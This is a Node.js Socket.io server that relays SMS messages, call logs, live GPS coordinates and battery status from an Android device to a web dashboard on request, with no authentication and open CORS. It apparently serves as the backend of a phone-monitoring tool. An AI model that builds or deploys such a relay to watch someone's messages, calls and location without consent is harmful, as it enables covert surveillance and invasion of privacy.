const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" } 
});

// Serve the static files (index.html, etc.) from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    console.log('User Connected:', socket.id);

    // ================= BATTERY & STATUS =================
    socket.on('battery-status', (data) => {
        // Forward battery percentage and charging status to the Web UI
        socket.broadcast.emit('ui-battery', data);
    });

    // ================= SMS MONITORING =================
    socket.on('get-sms-request', () => {
        // Web UI requests SMS -> Forward request to Android Device
        socket.broadcast.emit('get-sms-request');
    });

    socket.on('sms-data-log', (data) => {
        // Android sends SMS list -> Forward to Web UI for display
        socket.broadcast.emit('ui-sms-display', data);
    });

    // ================= CALL LOG MONITORING =================
    socket.on('get-calls-request', () => {
        // Web UI requests Call Logs -> Forward request to Android Device
        socket.broadcast.emit('get-calls-request');
    });

    socket.on('call-log-data', (data) => {
        // Android sends Call Log list -> Forward to Web UI for display
        socket.broadcast.emit('ui-calls-display', data);
    });

    // ================= GPS TRACKING =================
    socket.on('gps-update', (data) => {
        // Forward live coordinates and geocoded address to the Web UI map/top bar
        socket.broadcast.emit('ui-gps', data);
    });

    // ================= DISCONNECT LOGIC =================
    socket.on('disconnect', () => {
        console.log('User Disconnected');
        // Notify the UI that the device might be offline
        socket.broadcast.emit('device-status', { online: false });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is active on Port ${PORT}`);
});
